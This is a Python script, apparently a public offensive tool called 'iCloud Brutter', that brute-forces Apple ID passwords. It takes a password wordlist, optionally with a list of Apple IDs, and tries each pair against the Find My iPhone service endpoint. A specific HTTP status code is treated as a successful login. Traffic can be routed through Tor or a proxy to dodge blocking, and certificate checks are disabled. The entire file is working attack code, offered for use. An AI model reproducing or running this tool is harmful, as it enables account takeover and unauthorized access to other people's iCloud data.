#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# Coded by Momo Outaadi (M4ll0k)

import sys
import getopt
import urllib3
import plistlib
import requests
from requests import Session
from requests.auth import HTTPBasicAuth 

class iCloudBrute(object):
    def __init__(self,kwargs):
        self.kwargs = kwargs
    
    def readfile(self,path):
        return [line.strip() for line in open(path,'rb')]
    @property
    def tor(self):
        return 'socks5://127.0.0.1:9050'
    
    def banner(self):
        print(r"      _        ,..  ")
        print(r" ,--._\\_.--, (-00) iCloud Brutter v0.1.0")
        print(r"; #         _:(  -) by Momo Outaadi (M4ll0k)")
        print(r":          (_____/  https://github.com/m4ll0k")
        print(r":            :      ")
        print(r" '.___..___.`       ")
        print("                     ")
    
    def usage(self):
        print("Usage: %s [options]\n"%(sys.argv[0]))
        print("\t--id\t\tApple ID")
        print("\t--idw\t\tApple ID Wordlist")
        print("\t--wordlist\tWordlist")
        print("\t--proxy\t\tSet proxy")
        print("\t--tor\t\tUse tor\n")
        print("Example:")
        print("\t%s --id test@apple.com --wordlist pass.txt"%(sys.argv[0]))
        print("\t%s --id test@apple.com --wordlist pass.txt --tor"%(sys.argv[0]))
        print("\t%s --id test@apple.com --wordlist pass.txt --proxy 11.11.11.11\n"%(sys.argv[0]))
        exit()
    
    def main(self):
        self.banner()
        tor = False;apple_id=None
        proxy = None;idw=None
        if len(sys.argv) < 4:
            self.usage()
        try:
            opts,args = getopt.getopt(self.kwargs,"",["id=","idw=","wordlist=","proxy=","tor"])
        except getopt.GetoptError as e:
            self.usage()
        for opt,arg in opts:
            if opt in ("--id"): apple_id = arg
            if opt in ("--idw"): idw = arg
            if opt in ("--wordlist"): wordlist = arg
            if opt in ("--proxy"): proxy = arg
            if opt in ("--tor"): tor = True
        print('[ i ] Starting bruteforce...')
        if apple_id and wordlist:
            for p in self.readfile(wordlist):
                p = p.decode('utf-8')
                print("[ * ] Trying with password: %s"%p)
                r = self.check(apple_id,p,proxy,tor)
                if r is True:
                    print('[ + ] Password found: %s'%p)
                    break
                elif r is None:
                    print('[ ! ] Blocked!!!')
        if idw and wordlist:
            for i in self.readfile(idw):
                for p in self.readfile(wordlist):
                    p = p.decode('utf-8')
                    i = i.decode('utf-8')
                    print("[ * ] Trying Password: %s - ID: %s"%(p,i))
                    r = self.check(i,p,proxy,tor)
                    if r is True:
                        print('[ + ] Found Password: %s for ID: %s'%(p,i))
                        break
                    elif r is None: 
                        print('[ ! ] Blocked!!!')
        else: self.usage()
    
    def check(self,apple_id,passwd,proxy,tor):
        proxies = {}
        if tor is True: proxies = {'http':self.tor,'https':self.tor}
        if proxy != ('' or None): proxies = {'http':proxy,'https':proxy} 
        url = ('https://fmipmobile.icloud.com/fmipservice/device/%s/initClient'%apple_id)
        headers = {
            'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_2 like Mac OS X)'
        }
        data = {"clientContext": {"appName":"FindMyiPhone","osVersion":"7.0.4","clientTimestamp": 429746389281,
        "appVersion":"3.0","deviceUDID":"0123456789485ef5b1e6c4f356453be033d15622","inactiveTime":1,
        "buildVersion":"376","productType":"iPhone6,1"},"serverContext":{}}
        data = plistlib.writePlistToBytes(data).decode('utf-8')
        session = Session()
        req = requests.packages.urllib3.disable_warnings(
            urllib3.exceptions.InsecureRequestWarning
            )
        req = session.request(
            method = "POST",
            url = url,
            data = data,
            headers = headers,
            proxies = proxies,
            auth = HTTPBasicAuth(apple_id,passwd),
            verify = False
        )
        if req.status_code == 330: return True
        elif req.status_code == 401: return False
        else: return 
if __name__ == "__main__":
    try:
        iCloudBrute(sys.argv[1:]).main()
    except KeyboardInterrupt:
        exit(print("Exiting..."))